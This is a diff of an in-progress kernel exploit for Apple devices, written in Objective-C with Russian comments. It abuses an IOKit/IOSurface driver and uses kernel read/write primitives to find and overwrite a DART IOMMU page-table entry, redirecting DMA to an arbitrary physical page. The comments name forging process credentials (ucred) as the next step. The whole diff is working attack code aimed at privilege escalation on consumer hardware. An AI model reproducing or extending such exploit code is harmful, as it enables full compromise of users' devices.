@@ -6159,25 +6159,35 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     md = rP;   // не совпало: возможно IOSubMD — идём в parent
                     if (!kpLooksLikeKernelPointer(md)) break;
                 }
+                // 1.9.160: сырцовый дамп plane-desc (0x100) — читаем формат
+                // глазами, плюс pointee-скан: каждый ptr P → [P..P+0x80] на
+                // backingPA/pfn (буфер page-list может быть отдельной аллокацией).
+                if ((uint32_t)(pd & 0x3fff) + 0x100 <= 0x4000) {
+                    for (uint32_t o = 0; o + 8 <= 0x100; o += 8)
+                        kpNote(r, [NSString stringWithFormat:@"    pd+%#04x: %#018llx", o,
+                                  (unsigned long long)early_kread64(pd + o)]);
+                }
                 for (uint32_t o = 0; o + 8 <= 0x200 && nSlots < 8; o += 8) {
                     uint64_t P = kp_untag_ptr(early_kread64(pd + o));
-                    if (!kpLooksLikeKernelPointer(P) || (uint32_t)(P & 0x3fff) + 0x10 > 0x4000) continue;
-                    uint64_t a0 = early_kread64(P);
-                    uint64_t a1 = early_kread64(P + 8);
-                    int form = 0;
-                    if (a0 == backingPA) form = 2;
-                    else if ((uint32_t)(a0 >> 32) == pfn32) form = 1;
-                    else if (a0 == (backingPA >> 14)) form = 3;
-                    if (!form) continue;
-                    BOOL dup = NO;
-                    for (int j = 0; j < nSlots; j++) if (slotVAs[j] == P) { dup = YES; break; }
-                    if (dup) continue;
-                    kpNote(r, [NSString stringWithFormat:@"  ranges-ptr @ pd+%#x → %#llx: [0]=%#018llx [8]=%#018llx форма%d",
-                              o, (unsigned long long)P, (unsigned long long)a0, (unsigned long long)a1, form]);
-                    slotVAs[nSlots] = P;
-                    origQs[nSlots] = a0;
-                    slotForm[nSlots] = form;
-                    nSlots++;
+                    if (!kpLooksLikeKernelPointer(P) || (uint32_t)(P & 0x3fff) + 0x88 > 0x4000) continue;
+                    for (uint32_t o2 = 0; o2 + 8 <= 0x80; o2 += 8) {
+                        uint64_t q = early_kread64(P + o2);
+                        int form = 0;
+                        if ((uint32_t)(q >> 32) == pfn32) form = 1;
+                        else if (q == backingPA) form = 2;
+                        else if (q == (backingPA >> 14)) form = 3;
+                        else if ((uint32_t)q == pfn32) form = 4;
+                        if (!form) continue;
+                        BOOL dup = NO;
+                        for (int j = 0; j < nSlots; j++) if (slotVAs[j] == P + o2) { dup = YES; break; }
+                        if (dup) continue;
+                        kpNote(r, [NSString stringWithFormat:@"  pointee-hit @ pd+%#x→%#llx+%#x: %#018llx форма%d",
+                                  o, (unsigned long long)P, o2, (unsigned long long)q, form]);
+                        slotVAs[nSlots] = P + o2;
+                        origQs[nSlots] = q;
+                        slotForm[nSlots] = form;
+                        nSlots++;
+                    }
                 }
             }
             if (nSlots) {
@@ -6251,7 +6261,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint32_t churnSrcID = churnSrc ? IOSurfaceGetID(churnSrc) : srcID;
     uint32_t churnDstID = churnDst ? IOSurfaceGetID(churnDst) : dstID;
     uint8_t tsdZ[KP_M2_TSD_SIZE];
-    memset(tsdZ, 0, sizeof(tsdZ));
+    memcpy(tsdZ, tsdGood, sizeof(tsdZ));   // 1.9.160: валидные churn-опы — нулевой TSD ошибался мгновенно, backlog не держался
     *(uint32_t *)(tsdZ + 0) = churnSrcID;
     *(uint32_t *)(tsdZ + 4) = churnDstID;
     *(uint64_t *)(tsdZ + 8) = 1;   // async
@@ -6263,6 +6273,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint32_t *)(tsdV + 0) = srcID;
     *(uint32_t *)(tsdV + 4) = dstID;
     *(uint64_t *)(tsdV + 8) = 1;   // async
+    *(uint64_t *)(tsdV + 0x20) |= (1ULL << 43);   // 1.9.160 (р.36): reuse mapping — mapIOSurface пропускает re-map при [op+0xc04]==1
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
     kpNote(r, [NSString stringWithFormat:@"  victim async submit (backlog=800): kr=0x%x", avkr]);
     // 1.9.147: OP-ENTRY ОРАКУЛ — surfVA из самой оп-записи scheduler'а, без портов
@@ -6577,6 +6588,84 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===", changed]);
     } else {
         kpNote(r, @"=== контрольная не изменилась — см. выше ===");
+    }
+    // === 1.9.160 фаза 2: DART PTE patch с живым mapping (раунд 36) ===
+    // IOBufferMD вычисляет PA при prepare из kernel VA (+0xb8) — производные поля
+    // откатываются per-map (факт железа 1.9.158: откат +0x98). Поэтому: mapping
+    // жив (bit43=1 в TSD victim'а), ищем DART PTE по PA-маске 0x3FFFE000000
+    // (р.33/35), патчим PA-поле с сохранением флаг-бит, второй execute (тот же
+    // TSD, reuse) пишет в ctlPA.
+    if (isTable && victim != IO_OBJECT_NULL) {
+        uint64_t wVA = kpM2TClientVA(r, isTable, victim, @"p2-victim");
+        uint64_t ucVA = kpLooksLikeKernelPointer(wVA) ? kp_untag_ptr(early_kread64(wVA + 0x30)) : 0;
+        uint64_t provVA = kpLooksLikeKernelPointer(ucVA) ? kp_untag_ptr(early_kread64(ucVA + 0xe8)) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [P2] victim wrap=%#llx UC(fObject)=%#llx provider=%#llx",
+                  (unsigned long long)wVA, (unsigned long long)ucVA, (unsigned long long)provVA]);
+        uint64_t pipeVA = 0, mapVA = 0, dartVA = 0, groupVA = 0;
+        if (kpLooksLikeKernelPointer(provVA)) {
+            for (uint32_t pi = 0; pi < 8 && !pipeVA; pi++) {
+                uint64_t cand = kp_untag_ptr(early_kread64(provVA + 0x140 + (uint64_t)pi * 8));
+                if (kpLooksLikeKernelPointer(cand)) pipeVA = cand;
+            }
+        }
+        if (kpLooksLikeKernelPointer(pipeVA)) mapVA = kp_untag_ptr(early_kread64(pipeVA + 0x78));
+        if (kpLooksLikeKernelPointer(mapVA)) dartVA = kp_untag_ptr(early_kread64(mapVA + 0x30));
+        if (kpLooksLikeKernelPointer(dartVA)) groupVA = kp_untag_ptr(early_kread64(dartVA + 0xc50));
+        kpNote(r, [NSString stringWithFormat:@"  [P2] pipe=%#llx mapper=%#llx dart=%#llx group=%#llx",
+                  (unsigned long long)pipeVA, (unsigned long long)mapVA,
+                  (unsigned long long)dartVA, (unsigned long long)groupVA]);
+        uint64_t pteVA = 0, origPTE = 0;
+        if (kpLooksLikeKernelPointer(groupVA)) {
+            uint64_t gptrs[24];
+            int gn = 0;
+            for (uint32_t o = 0; o + 8 <= 0x200 && gn < 24; o += 8) {
+                uint64_t p = kp_untag_ptr(early_kread64(groupVA + o));
+                if (!kpLooksLikeKernelPointer(p)) continue;
+                BOOL dup = NO;
+                for (int j = 0; j < gn; j++) if (gptrs[j] == p) { dup = YES; break; }
+                if (!dup) gptrs[gn++] = p;
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [P2] group: %d указателей — сканирую страницы на PA-маску", gn]);
+            for (int g = 0; g < gn && !pteVA; g++) {
+                uint32_t lim2 = 0x4000 - (uint32_t)(gptrs[g] & 0x3fff);
+                for (uint32_t o2 = 0; o2 + 8 <= lim2; o2 += 8) {
+                    uint64_t q = early_kread64(gptrs[g] + o2);
+                    if ((q & 0x000003FFFE000000ULL) != (backingPA & 0x000003FFFE000000ULL)) continue;
+                    if (!(q & ~0x000003FFFE000000ULL)) continue;   // голый PA без флагов — не PTE
+                    pteVA = gptrs[g] + o2;
+                    origPTE = q;
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] ★ PTE @ %#llx: %#018llx (PA совпал, флаги %#llx)",
+                              (unsigned long long)pteVA, (unsigned long long)q,
+                              (unsigned long long)(q >> 51)]);
+                    break;
+                }
+            }
+        }
+        if (pteVA) {
+            uint64_t newPTE = (origPTE & ~0x000003FFFE000000ULL) | (ctlPA & 0x000003FFFE000000ULL);
+            kpNote(r, [NSString stringWithFormat:@"  [P2] ПОДМЕНА PTE %#018llx → %#018llx", (unsigned long long)origPTE, (unsigned long long)newPTE]);
+            early_kwrite64(pteVA, newPTE);
+            uint64_t rb = early_kread64(pteVA);
+            kpNote(r, [NSString stringWithFormat:@"  [P2] readback PTE = %#018llx — %@",
+                      (unsigned long long)rb, rb == newPTE ? @"ПРИЛИПЛО" : @"НЕ прилипло (SPTM?)"]);
+            if (rb == newPTE) {
+                kern_return_t v2kr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
+                kpNote(r, [NSString stringWithFormat:@"  [P2] victim #2 submit (reuse mapping): kr=0x%x — жду DMA в ctl", v2kr]);
+                usleep(300000);
+                int changed2 = 0;
+                for (uint32_t i = 0; i < 0x4000; i += 4) {
+                    uint32_t px = *(volatile uint32_t *)(ctl + i);
+                    if (px != 0xCCCCCCCC && px != 0) { changed2++; if (changed2 <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
+                }
+                if (changed2) {
+                    kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED (DART PTE path): контрольная страница изменена DMA (%u dword) — PTE patch + reuse mapping РАБОТАЕТ. Дальше форж ucred ===", changed2]);
+                } else {
+                    kpNote(r, @"  [P2] ctl не изменилась после PTE-патча — mapping не выжил (purge?) или execute не перечитал PTE");
+                }
+            }
+        } else {
+            kpNote(r, @"  [P2] PTE не найден (цепочка/скан пуст) — mapping снёрнут после execute#1 или таблицы вне читаемых регионов");
+        }
     }
     IOObjectRelease(svc);   // коннекшены НЕ закрываем (teardown = наша мина)
     free(ctl);
